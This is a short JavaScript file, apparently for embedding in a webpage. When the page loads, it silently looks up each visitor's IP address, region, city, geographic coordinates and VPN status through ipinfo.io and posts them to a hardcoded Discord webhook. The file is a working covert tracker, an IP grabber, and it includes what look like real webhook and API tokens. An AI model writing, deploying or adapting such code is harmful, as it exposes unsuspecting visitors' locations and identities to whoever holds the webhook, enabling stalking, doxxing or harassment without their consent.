// Replace with your new Discord webhook URL
const webhookURL = 'https://discord.com/api/webhooks/1305718591835869275/5YU0l9wJLlYU1PLoYapm7Fu-n1wk9N8e26UTjyivrfDviH5grlUhbEXYbItQ-ap0n88r';

// Function to get user's IP and other information
async function sendDataToDiscord() {
    try {
        // Fetching user's IP and location data
        const ipResponse = await fetch('https://ipinfo.io/json?token=5b1586aef6434c');

        if (!ipResponse.ok) {
            throw new Error(`Failed to fetch IP info: ${ipResponse.statusText}`);
        }

        const ipData = await ipResponse.json();
        console.log("Fetched IP data:", ipData); // Log the fetched data

        // Constructing the message
        const embed = {
            title: "User Location Data",
            color: 3066993, // Color of the embed (Hexadecimal)
            fields: [
                { name: "IP", value: ipData.ip || 'N/A', inline: true },
                { name: "State", value: ipData.region || 'N/A', inline: true },
                { name: "City", value: ipData.city || 'N/A', inline: true },
                { name: "GEO", value: ipData.loc || 'N/A', inline: true },
                { name: "VPN", value: ipData.vpn ? "Yes" : "No", inline: true } // Adjust according to your VPN detection method
            ],
            footer: {
                text: "Data sent from a webpage visit"
            }
        };

        // Sending the embed to Discord
        const discordResponse = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ embeds: [embed] })
        });

        if (!discordResponse.ok) {
            throw new Error(`Failed to send data to Discord: ${discordResponse.statusText}`);
        }

        console.log("Data sent to Discord successfully!");
    } catch (error) {
        console.error("Error:", error);
    }
}

// Call the function to send data when the page loads
window.onload = sendDataToDiscord;
